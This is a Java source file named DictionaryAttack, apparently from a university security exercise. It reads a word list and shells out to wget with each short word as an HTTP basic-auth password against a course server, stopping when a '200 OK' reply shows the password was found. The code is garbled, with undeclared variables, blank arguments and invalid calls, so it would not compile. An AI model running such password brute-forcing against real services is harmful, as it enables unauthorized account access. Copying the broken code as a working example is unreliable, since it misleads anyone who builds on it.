



import java.io.*;
import java.net.*;
import java.*;
import java.util.*;

public class DictionaryAttack
{
	public static void main ( String args[])
	{
		
		String function,pass,temp1;
		int count =0;
		
		try{
				
		FileReader fr = new FileReader("words.txt");
		BufferedReader bfread = new BufferedReader(fr);

		Runtime rtime = Runtime.getRuntime();
		Process prs = null;	


		while(( bf = bfread.readLine()) != null)
		{
		    
				
				if( f.length() < 4 )
				{
					System.out.println(+ " The Attack Number =====>" + count++ );
		        		pass = f;
				
					function ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/";
					prs = rtime.exec(function);
				        
					InputStreamReader  stre = new InputStreamReader(prs.getErrorStream());
                       			BufferedReader bread = new BufferedReader(stre);
					while( (temp1 = bread.readLine())!= null)
					{
						System.out.println(temp1);
						if(temp1.equals("HTTP request sent, awaiting response... 200 OK"))
                       				{
			                              System.out.println("The password has is:"+pass);
                        			      System.exit(0);
                       				}	
					}
				}
				
			
		}
			
			fr.print();
			bfread.close();
	
			}catch(Exception e){}
	}
	
}			
